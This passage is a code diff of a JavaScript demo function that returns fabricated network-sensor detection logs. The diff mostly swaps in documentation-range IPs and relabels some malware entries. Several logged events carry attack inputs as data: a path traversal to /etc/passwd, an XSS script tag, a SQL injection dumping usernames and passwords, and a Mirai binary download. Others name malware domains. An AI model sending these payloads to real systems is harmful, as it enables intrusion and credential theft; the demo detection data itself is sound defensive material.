4057,4058,4068,4070,4071,4075,4076,4077,4082,4083,4085,4086,4088,4089,4090,4108,4109,4110,4121,4122,4123,4128,4129,4133,4134,4135,4140,4141,4148,4156,4157,4160,4164,4170,4171,4179,4180,4184,4188,4189,4191,4192,4198,4208,4209,4211,4212,4214,4215,4218,4219,4220,4221,4222,4229,4230,4231,4232,4233,4238,4239,4240,4241,4242,4244,4252,4259,4260,4266,4267,4269,4270,4272,4280,4281,4282,4284,4285,4290,4293,4294,4296,4297,4308,4312,4317,4318,4329,4330,4332,4333,4341,4344,4345,4351,4354,4355,4356,4359,4360,4361,4362,4363,4365,4370,4371,4374,4377,4378,4380,4381,4382,4383,4384,4386,4387,4388,4392,4393,4402,4403,4405,4406,4407,4408,4412,4413,4416,4418,4419,4421,4422,4423,4425,4426,4428,4429,4430,4431,4432,4433,4434,4435,4436,4437,4438,4439,4440,4441,4443,4444,4446,4447,4453,4454,4459,4463,4464,4465,4466,4470,4471,4472,4477,4481,4482,4486,4487,4488,4495,4496,4498,4501,4502,4503,4504,4508,4509,4513,4514,4515,4518,4519,4520,4521,4523,4524,4529,4530,4533,4534,4537,4538,4539,4540,4546,4547,4548,4553,4554,4557,4558,4563,4564,4565,4569,4570,4571,4572,4573,4581,4582,4585,4589,4590,4591,4592,4596,4597,4599,4600,4602,4605,4608,4609,4610,4613,4614,4615,4621,4622,4624,4625,4633,4634,4635,4636,4639,4640,4641,4647,4648,4650,4664,4665,4666,4669,4672,4673,4675,4676,4683,4684,4685,4690,4691,4692,4693,4700,4703,4704,4709,4710,4712,4713,4715,4716,4718,4719,4720,4725,4726,4727,4728,4735,4736,4740,4741,4742,4743,4744,4751,4753,4760,4761,4762,4767,4768,4769,4770,4771,4776,4777,4778,4786,4787,4791,4792,4793,4794,4795,4796,4805,4806,4808,4812,4813,4820,4821,4823,4830,4835,4842,4845,4849,4850,4856,4857,4858,4859,4861,4866,4867,4869,4874,4875,4881,4882,4891,4892,4893,4897,4900,4901,4902,4909,4910,4911,4912,4919,4927,4928,4931,4932,4933,4934,4935,4940,4943,4956,4959,4960,4961,4963,4975,4976,4979,4980,4982,4983,4984,4985,4987,4990,4991 TCP IP 89.248.165.69 "potential port scanning" (heuristic)\n' +
@@ -545,11 +545,11 @@ function getDemoCSV() {
     '"2024-01-11 05:40:15.732222" r2d2 10.1.19.42 59949 208.68.240.103 80 TCP UA "OINC (BOINC client \\(windows_x86_64 7.16.7\\))" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 05:42:29.493799" r2d2 2.200.110.232 63611 2.200.107.169 53 UDP DNS tredokilo745241.ru "zeus (malware)" (static)\n' +
     '"2024-01-11 05:42:43.386063" r2d2 2.200.107.146 34984 199.249.120.1 53 UDP DNS (www).porezna-uprava.org "balkanrat (malware)" (static)\n' +
-    '"2024-01-11 05:43:15.090181" r2d2 2.200.104.32 50006 203.0.113.12 80 TCP URL trav.example(/download?file=../../../../etc/passwd) "potential directory traversal (suspicious)" (heuristic)\n' +
+    '"2024-01-11 05:43:15.090181" r2d2 10.124.72.52 50006 203.0.113.12 80 TCP URL trav.example(/download?file=../../../../etc/passwd) "potential directory traversal (suspicious)" (heuristic)\n' +
     '"2024-01-11 05:43:32.000825" r2d2 2.200.108.59 17101,17102,17103,17104,17107,17109,17112,17114,17115,17118,17120,17124,17125,17127,29059,29060,29061,34372,34506,36242,38006,38790,38974,39304,40820,41424,41604,42178,42298,43356,43988,44556,45014,45272,45468,45680,45888,47536,47590,49410,50102,50374,51220,51226,51892,54726,56070,56600,59012,59150,59288,60854 77.53.81.105 21,5666,5961,7218,10157,10800,12095,15175,15888,20138,22229,24707,26191,26306,29083,29688,30057,30074,39311,43908,46319,49619,51487,51966,52083,53380,55018,56269,56694,57304,58250,59314,61478,61795 TCP IP 2.200.108.59 "potential port scanning" (heuristic)\n' +
     '"2024-01-11 05:43:33.001789" r2d2 2.200.108.59 17115,17117,17118,17119,17120,17121,17123,17126,29064,32824,33396,34318,35492,35778,36242,36636,38502,38568,38974,39252,40124,41604,41836,42178,43356,43988,44112,44600,44766,45260,45534,45680,46016,46542,46962,48148,49410,50392,50782,51202,51225,52728,53784,54330,56030,56600,58280,58340,58810,59044,59364,59386,59632,60574,60602,60628,60794,60854,60866 77.53.81.105 21,5559,5775,5961,6264,10157,12095,12809,13721,13779,15016,15549,15888,16544,20800,21034,22229,22330,24591,25155,26191,26582,28217,29083,30074,32826,34391,34522,38151,39311,40940,43908,44074,44325,46540,47645,48139,51275,55581,56667,56696,57612,57939,58917,59943,60178,61002,62201,63811,64646 TCP IP 2.200.108.59 "potential port scanning" (heuristic)\n' +
     '"2024-01-11 05:47:06.022089" r2d2 10.3.160.42 21378 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 05:50:30.436473" r2d2 10.3.160.42 50012 203.0.113.17 80 TCP URL dl.example(/setup.exe) "direct .exe download (suspicious)" (heuristic)\n' +
+    '"2024-01-11 05:50:30.436473" r2d2 10.2.120.16 50012 203.0.113.17 80 TCP URL dl.example(/setup.exe) "direct .exe download (suspicious)" (heuristic)\n' +
     '"2024-01-11 05:51:08.402224" r2d2 10.3.160.42 21380 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 05:51:43.396629" r2d2 2.200.110.232 64728 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 05:55:18.058679" r2d2 2.200.110.233 63488 2.200.107.168 53 UDP DNS recenthosts.ru "generic (malware)" (static)\n' +
@@ -562,7 +562,7 @@ function getDemoCSV() {
     '"2024-01-11 05:59:43.393588" r2d2 2.200.110.232 64059 2.200.107.168 53 UDP DNS (www.2td6).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 06:00:02.956307" r2d2 164.68.112.178 40728 2.200.109.88 80 TCP UA "masscan(/1.0 \\(https://github.com/robertdavidgraham/masscan\\))" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 06:01:07.151310" r2d2 10.3.160.42 21385 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 06:02:33.955830" r2d2 10.2.120.16 - 185.220.101.47 - ICMP IP 185.220.101.47 "wannacry (malware)" (static)\n' +
+    '"2024-01-11 06:02:33.955830" r2d2 10.124.72.51 - 192.0.2.66 - ICMP IP 192.0.2.66 "wannacry (malware)" (static)\n' +
     '"2024-01-11 06:02:47.422848" r2d2 2.200.107.146 27703 192.36.144.107 53 UDP DNS ns1.frobbit.se "rogue dns (malicious)" (static)\n' +
     '"2024-01-11 06:02:52.472264" r2d2 2.200.97.1 52813 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 06:03:29.630703" r2d2 2.200.110.233 63640 2.200.107.169 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
@@ -574,11 +574,11 @@ function getDemoCSV() {
     '"2024-01-11 06:04:42.516650" r2d2 10.1.81.47 53122 10.1.20.50 53 UDP DNS id.remoteutilities.com "rmsrat (malware)" (static)\n' +
     '"2024-01-11 06:05:09.579445" r2d2 10.3.160.42 17737 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 06:05:11.082679" r2d2 10.3.160.42 17737 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 06:05:29.223588" r2d2 2001:db8:2::17 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 06:05:29.223588" r2d2 2001:db8:2::17 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 06:08:09.725002" r2d2 2.200.110.233 65120 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 06:08:59.612216" r2d2 2.200.110.232 49400 2.200.107.168 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 06:09:19.647390" r2d2 2.200.107.146 62004 194.190.124.17 53 UDP DNS tredokilo745241.ru "zeus (malware)" (static)\n' +
-    '"2024-01-11 06:10:12.674164" r2d2 10.2.120.16 50008 203.0.113.14 80 TCP URL xss.example(/search?q=<script>alert%281%29</script>) "potential xss injection (suspicious)" (heuristic)\n' +
+    '"2024-01-11 06:10:12.674164" r2d2 10.43.192.103 50008 203.0.113.14 80 TCP URL xss.example(/search?q=<script>alert%281%29</script>) "potential xss injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 06:10:43.383407" r2d2 2.200.107.146 28272 194.62.182.53 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 06:11:10.053834" r2d2 10.3.160.42 17740 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 06:11:39.808140" r2d2 2.200.107.146 32804 194.62.183.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
@@ -594,7 +594,7 @@ function getDemoCSV() {
     '"2024-01-11 06:20:59.623934" r2d2 2.200.110.232 49449 2.200.107.169 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 06:21:12.597223" r2d2 10.3.160.42 17745 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 06:21:35.965316" r2d2 2.200.109.177 61782 8.8.8.8 53 UDP DNS (oct2062.goool7).ws "domain (suspicious)" (static)\n' +
-    '"2024-01-11 06:21:41.857490" r2d2 10.3.160.42 50011 9.9.9.9 53 UDP DNS payroll-export.internal.corp "internal watchlist (custom)" (custom)\n' +
+    '"2024-01-11 06:21:41.857490" r2d2 10.2.120.16 50011 9.9.9.9 53 UDP DNS payroll-export.internal.corp "internal watchlist (custom)" (custom)\n' +
     '"2024-01-11 06:22:29.027780" r2d2 2.200.104.32 56808,62847 93.184.221.240 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 06:23:11.499144" r2d2 164.68.112.178 40728 2.200.109.28,2.200.109.31 80 TCP UA "masscan(/1.0 \\(https://github.com/robertdavidgraham/masscan\\))" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 06:23:11.499152" r2d2 164.68.112.178 40728 2.200.109.24,2.200.109.28,2.200.109.31 80 TCP UA "masscan(/1.0 \\(https://github.com/robertdavidgraham/masscan\\))" "user agent (suspicious)" (heuristic)\n' +
@@ -619,7 +619,7 @@ function getDemoCSV() {
     '"2024-01-11 06:33:02.319581" r2d2 2.200.110.232 65046 2.200.107.169 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 06:33:13.236962" r2d2 10.3.160.42 17751 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 06:33:32.000602" r2d2 2.200.108.59 20110,20115,20117,20118,20119,20120,20124,20125,20126,20133,20134,20135,20137,20138,30657,30658,30659,30660,30661,32830,33648,34282,35806,35822,35922,36084,36246,36444,36702,37004,37100,37408,38172,39360,39532,39946,40044,40090,40152,40428,40826,40966,40982,41092,41288,41598,42486,42538,42708,42766,42932,43374,44360,45292,45990,46004,46066,46408,46446,46468,47380,47608,47848,47988,48520,49076,49108,49288,49384,50072,50114,50748,51310,51870,52278,52296,52654,52655,52658,52910,53942,54688,54894,54922,55180,55294,55544,55764,56252,57712,57996,58048,58846,59012,59820,60276,60868 77.53.81.105 21,5140,6471,6472,7156,9115,10102,10736,11581,11759,14460,14485,15272,15680,16330,16975,17297,17533,19453,22047,23859,24309,25873,27040,28371,28394,29314,30234,30572,30965,31074,33970,34033,34035,35065,35238,35479,36236,38046,38768,39159,39387,39723,42500,42689,43305,44156,44178,45189,46084,46623,47310,47342,47818,48120,50192,51043,52862,54145,54779,55827,56029,56956,57030,57356,57872,58739,59671,60386,61354,62593,63238,63247,63565,64906,65404 TCP IP 2.200.108.59 "potential port scanning" (heuristic)\n' +
-    '"2024-01-11 06:33:41.748609" r2d2 10.2.120.16 51000 91.219.236.18 443 TCP IPORT 91.219.236.18:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
+    '"2024-01-11 06:33:41.748609" r2d2 10.43.192.103 51000 203.0.113.77 443 TCP IPORT 203.0.113.77:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
     '"2024-01-11 06:34:43.085550" r2d2 10.43.192.103 62393 213.252.245.197 453 TCP IPORT 213.252.245.197:453 "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 06:34:43.382881" r2d2 2.200.110.232 63420 2.200.107.168 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 06:35:14.978708" r2d2 10.3.160.42 4262 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
@@ -656,7 +656,7 @@ function getDemoCSV() {
     '"2024-01-11 06:46:11.297695" r2d2 10.43.192.103 62595 213.252.245.197 453 TCP IPORT 213.252.245.197:453 "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 06:46:23.360408" r2d2 10.43.192.103 62597 213.252.245.197 453 TCP IPORT 213.252.245.197:453 "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 06:46:59.568411" r2d2 10.43.192.103 62603 213.252.245.197 453 TCP IPORT 213.252.245.197:453 "crypto mining (suspicious)" (static)\n' +
-    '"2024-01-11 06:47:08.010514" r2d2 2001:db8:5::4 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 06:47:08.010514" r2d2 2001:db8:5::4 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 06:47:43.407254" r2d2 2.200.107.146 35043 194.62.182.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 06:47:53.916711" r2d2 10.43.192.103 62614 213.252.245.197 453 TCP IPORT 213.252.245.197:453 "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 06:47:59.952558" r2d2 10.43.192.103 62616 213.252.245.197 453 TCP IPORT 213.252.245.197:453 "crypto mining (suspicious)" (static)\n' +
@@ -704,9 +704,9 @@ function getDemoCSV() {
     '"2024-01-11 06:55:22.713737" r2d2 10.2.120.16 1027 10.1.20.50 53 UDP DNS ykwqc.net "conficker dga (malware)" 360.com\n' +
     '"2024-01-11 06:55:43.382151" r2d2 2.200.110.232 64578 2.200.107.168 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 06:56:03.558301" r2d2 2.200.107.146 21878 212.18.248.42 53 UDP DNS (updatepopcorntime).xyz "domain (suspicious)" (static)\n' +
-    '"2024-01-11 06:56:05.909385" r2d2 2.200.110.232 31000 9.9.9.9 53 UDP DNS (h01000).lookup.aeqx-cdn.net "potential dns exhaustion (suspicious)" (heuristic)\n' +
+    '"2024-01-11 06:56:05.909385" r2d2 10.128.3.51 31000 9.9.9.9 53 UDP DNS (h01000).lookup.aeqx-cdn.net "potential dns exhaustion (suspicious)" (heuristic)\n' +
     '"2024-01-11 06:56:59.607071" r2d2 2.200.110.232 63791 2.200.107.168 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
-    '"2024-01-11 06:57:01.590396" r2d2 10.2.120.16 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
+    '"2024-01-11 06:57:01.590396" r2d2 10.124.72.51 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
     '"2024-01-11 06:58:04.074472" r2d2 10.2.120.51 52289 10.1.20.238 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 06:58:20.000799" r2d2 2.200.110.232 49313 2.200.107.168 53 UDP DNS iynus.net "locky (malware)" (static)\n' +
     '"2024-01-11 06:58:20.371458" r2d2 2.200.110.232 64394 2.200.107.168 53 UDP DNS tredokilo745241.ru "zeus (malware)" (static)\n' +
@@ -749,13 +749,13 @@ function getDemoCSV() {
     '"2024-01-11 07:25:49.581521" r2d2 10.36.40.193 64681 10.1.194.234 53 UDP DNS epicunitscan.info "patchbrowse (malware)" (static)\n' +
     '"2024-01-11 07:26:30.754833" r2d2 2.200.107.168 53 2.200.110.232 64568 UDP DNS (www.roadrunnersportsnew).club "parked site (suspicious)" (heuristic)\n' +
     '"2024-01-11 07:27:12.158473" r2d2 10.1.19.42 60308 208.68.240.103 80 TCP UA "OINC (BOINC client \\(windows_x86_64 7.16.7\\))" "user agent (suspicious)" (heuristic)\n' +
-    '"2024-01-11 07:27:16.754595" r2d2 2.200.110.232 50013 203.0.113.18 80 TCP HTTP 203.0.113.18/adminpanel "missing host header (suspicious)" (heuristic)\n' +
+    '"2024-01-11 07:27:16.754595" r2d2 10.128.3.52 50013 203.0.113.18 80 TCP HTTP 203.0.113.18/adminpanel "missing host header (suspicious)" (heuristic)\n' +
     '"2024-01-11 07:27:34.789836" r2d2 2.200.110.232 53147 2.200.107.168 53 UDP DNS epicunitscan.info "patchbrowse (malware)" (static)\n' +
     '"2024-01-11 07:28:07.573822" r2d2 2.200.104.32 57389 93.184.221.240 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 07:28:40.236097" r2d2 2.200.110.233 64637 2.200.107.168 53 UDP DNS iynus.net "locky (malware)" (static)\n' +
     '"2024-01-11 07:28:41.508679" r2d2 2.200.107.146 31001 45.54.64.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 07:29:58.497713" r2d2 164.68.112.178 40728 2.200.110.97 80 TCP UA "masscan(/1.0 \\(https://github.com/robertdavidgraham/masscan\\))" "user agent (suspicious)" (heuristic)\n' +
-    '"2024-01-11 07:29:59.689010" r2d2 2.200.104.32 50010 198.51.100.99 80 TCP HTTP (198.51.100.99)/mirai.x86 "potential iot-malware download (suspicious)" (heuristic)\n' +
+    '"2024-01-11 07:29:59.689010" r2d2 10.128.8.51 50010 198.51.100.99 80 TCP HTTP (198.51.100.99)/mirai.x86 "potential iot-malware download (suspicious)" (heuristic)\n' +
     '"2024-01-11 07:30:07.821371" r2d2 2.200.110.233 63828 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 07:31:23.737506" r2d2 10.3.160.42 16610 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 07:31:23.737506" "dmz probe" 10.3.160.42 16610 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
@@ -832,10 +832,10 @@ function getDemoCSV() {
     '"2024-01-11 07:50:37.619094" "dmz probe" 2.200.104.32 56414 65.22.161.17 53 UDP DNS ipinfo.io "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 07:50:52.020352" r2d2 2.200.110.233 64256 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 07:51:01.895830" r2d2 8.8.8.8 53 2.200.104.32 57609 UDP DNS srvsccm2.redacted.com "excessive no such domain (suspicious)" (heuristic)\n' +
-    '"2024-01-11 07:51:20.722243" r2d2 10.2.120.16 50011 9.9.9.9 53 UDP DNS payroll-export.internal.corp "internal watchlist (custom)" (custom)\n' +
+    '"2024-01-11 07:51:20.722243" r2d2 10.124.72.51 50011 9.9.9.9 53 UDP DNS payroll-export.internal.corp "internal watchlist (custom)" (custom)\n' +
     '"2024-01-11 07:51:34.750201" r2d2 192.168.30.252 54416 213.147.96.52 53 UDP DNS ipinfo.io "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 07:51:34.755477" r2d2 192.168.30.251 64036 216.239.32.110 53 UDP DNS ipinfo.io "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 07:53:50.881636" r2d2 2.200.110.232 50600 194.147.85.62 443 TCP JA3 1e7c622032b0cb79401b0f7be3793a1a "emotet (malware)" abuse.ch\n' +
+    '"2024-01-11 07:53:50.881636" r2d2 10.128.3.52 50600 203.0.113.35 443 TCP JA3 1e7c622032b0cb79401b0f7be3793a1a "emotet (malware)" abuse.ch\n' +
     '"2024-01-11 07:54:22.055693" r2d2 2.200.107.146 36128 45.54.64.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 07:54:24.464993" r2d2 2.200.109.2 53178 2.23.97.208 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 07:54:24.674490" r2d2 2.200.105.226 58259 208.67.222.123 53 UDP DNS (go.cp4srvng).xyz "domain (suspicious)" (static)\n' +
@@ -857,35 +857,35 @@ function getDemoCSV() {
     '"2024-01-11 07:58:47.176116" r2d2 2.200.109.177 55841 8.8.8.8 53 UDP DNS epicunitscan.info "patchbrowse (malware)" (static)\n' +
     '"2024-01-11 07:58:59.616160" r2d2 2.200.110.232 64329 2.200.107.169 53 UDP DNS iynus.net "locky (malware)" (static)\n' +
     '"2024-01-11 07:58:59.627243" r2d2 2.200.110.232 65531 2.200.107.169 53 UDP DNS tredokilo745241.ru "zeus (malware)" (static)\n' +
-    '"2024-01-11 07:59:24.792960" r2d2 10.2.120.16 50600 194.147.85.62 443 TCP JA3 1e7c622032b0cb79401b0f7be3793a1a "emotet (malware)" abuse.ch\n' +
+    '"2024-01-11 07:59:24.792960" r2d2 10.124.72.51 50600 203.0.113.35 443 TCP JA3 1e7c622032b0cb79401b0f7be3793a1a "emotet (malware)" abuse.ch\n' +
     '"2024-01-11 07:59:41.986395" r2d2 2.200.108.98 55879 2.200.107.168 53 UDP DNS ipapi.co "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 08:01:18.529004" r2d2 2.200.107.146 61119 37.209.198.12 53 UDP DNS content-delivery.in "afrodita (malware)" (static)\n' +
-    '"2024-01-11 08:01:30.523773" r2d2 2.200.104.32 50013 203.0.113.18 80 TCP HTTP 203.0.113.18/adminpanel "missing host header (suspicious)" (heuristic)\n' +
+    '"2024-01-11 08:01:30.523773" r2d2 10.124.72.52 50013 203.0.113.18 80 TCP HTTP 203.0.113.18/adminpanel "missing host header (suspicious)" (heuristic)\n' +
     '"2024-01-11 08:01:33.212705" r2d2 2.200.110.232 63382 2.200.107.169 53 UDP DNS ofhappinyer.com "pushbug (malicious)" (static)\n' +
     '"2024-01-11 08:01:43.380761" r2d2 2.200.110.232 63956 2.200.107.169 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 08:02:32.274705" r2d2 2.200.110.233 49316 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 08:02:33.116637" r2d2 192.168.30.251 63542 173.245.59.41 53 UDP DNS (cdn).special-offers.online "pushbug (malicious)" (static)\n' +
     '"2024-01-11 08:03:28.769202" r2d2 2.200.107.248 10651 8.8.8.8 53 UDP DNS (go.cp4srvng).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 08:03:31.000354" r2d2 2.200.108.59 22423,22425,22431,22442,22445,22449,22450,22452,22455,22458,22459,22460,22461,22468,22469,22473,22474,22476,22477,22481,22482,22484,22490,22495,22498,22500,22502,22503,22505,22507,22508,22511,22514,22515,22516,22517,22519,22521,22526,22527,32904,33046,34104,34438,34556,34558,34566,34588,35112,35258,35696,35838,36415,36417,36418,36422,36425,36426,36428,36940,37262,37416,37890,38078,38208,39024,39054,39196,39606,40004,40046,42294,42372,42436,42598,43034,43192,43286,44298,44448,44710,44782,45352,45420,45672,45768,47136,47302,47870,47966,48784,48870,49180,49364,50610,50614,50908,51380,51486,51628,52232,52268,52308,52548,52724,53252,53814,53926,53984,54296,54300,54726,54968,55872,55910,56162,56250,56312,56334,57044,57342,57345,57347,57348,57349,57352,58116,58130,58280,58890,58986,59490,59916,59988,60076,60152,60452,60502,60962 77.53.81.105 21,5018,6703,7055,7088,7658,10023,10860,11092,12754,12868,14656,14742,14982,14999,16917,17099,17173,17389,19159,19214,20771,21640,21661,22335,23406,24105,25836,26052,29686,30121,30517,32382,32643,34262,34621,35487,35688,36583,36802,38113,38612,39279,39552,39567,40228,41773,42270,43360,43995,44408,47300,47668,48498,48677,48947,49457,49581,50438,50525,50594,51082,51409,51527,51541,52198,52385,53641,53681,54085,54352,55289,56330,56506,57075,58950,60690,60909,61361,61582,61594,61906,62989,63092,64192,65270,65315 TCP IP 2.200.108.59 "potential port scanning" (heuristic)\n' +
-    '"2024-01-11 08:06:12.625865" r2d2 10.2.120.16 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
+    '"2024-01-11 08:06:12.625865" r2d2 10.124.72.51 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 08:06:38.819264" r2d2 192.168.30.252 55531 213.147.96.52 53 UDP DNS (i.rmbl).ws "domain (suspicious)" (static)\n' +
     '"2024-01-11 08:07:26.763385" r2d2 2.200.107.248 17803 8.8.8.8 53 UDP DNS (go.cp4srvng).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 08:07:29.059711" r2d2 10.3.160.42 7371 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 08:07:30.456052" r2d2 10.3.160.42 7371 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 08:07:54.588046" r2d2 192.168.239.11 53 192.168.137.119 50848 UDP DNS (amcdaca).org "parked site (suspicious)" (heuristic)\n' +
-    '"2024-01-11 08:07:59.956316" r2d2 2001:db8:2::17 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 08:07:59.956316" r2d2 2001:db8:2::17 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 08:08:03.998287" r2d2 10.124.72.51 1372 8.8.4.4 53 UDP DNS hzmksreiuojy.com "andromeda (malware)" (static)\n' +
     '"2024-01-11 08:08:04.027080" r2d2 2.200.104.184 62146 192.42.176.30 53 UDP DNS (app.nexios).cc "domain (suspicious)" (static)\n' +
     '"2024-01-11 08:08:10.701418" r2d2 2.200.105.226 26641 212.247.156.66 53 UDP DNS ofhappinyer.com "pushbug (malicious)" (static)\n' +
     '"2024-01-11 08:08:19.270475" r2d2 2.200.107.146 44950 52.57.28.60 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 08:09:14.210926" r2d2 10.1.192.180 80 10.2.21.99 57644 TCP HTTP application/x-sh "content type (suspicious)" (heuristic)\n' +
     '"2024-01-11 08:10:02.133922" r2d2 2.200.107.248 11319 8.8.8.8 53 UDP DNS ipapi.co "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 08:10:09.070686" r2d2 2.200.104.32 - 185.220.101.47 - ICMP IP 185.220.101.47 "wannacry (malware)" (static)\n' +
+    '"2024-01-11 08:10:09.070686" r2d2 10.128.8.51 - 192.0.2.66 - ICMP IP 192.0.2.66 "wannacry (malware)" (static)\n' +
     '"2024-01-11 08:10:21.004190" r2d2 10.124.72.51 1394 8.8.4.4 53 UDP DNS hzmksreiuojy.com "andromeda (malware)" (static)\n' +
     '"2024-01-11 08:10:30.793606" r2d2 192.168.30.251 52280 173.245.59.41 53 UDP DNS (cdn).special-offers.online "pushbug (malicious)" (static)\n' +
     '"2024-01-11 08:10:30.819594" r2d2 2.200.104.32 55350 213.147.96.51 53 UDP DNS (cdn).special-offers.online "pushbug (malicious)" (static)\n' +
-    '"2024-01-11 08:10:39.774186" r2d2 2.200.110.232 51000 91.219.236.18 443 TCP IPORT 91.219.236.18:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
-    '"2024-01-11 08:10:55.209832" r2d2 2001:db8:2::11 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 08:10:39.774186" r2d2 10.128.3.51 51000 203.0.113.77 443 TCP IPORT 203.0.113.77:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
+    '"2024-01-11 08:10:55.209832" r2d2 2001:db8:2::11 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 08:11:34.145177" r2d2 2.200.109.177 53964 8.8.8.8 53 UDP DNS (pro).ip-api.com "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 08:11:43.598149" r2d2 10.4.20.51 63168 10.1.20.238 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
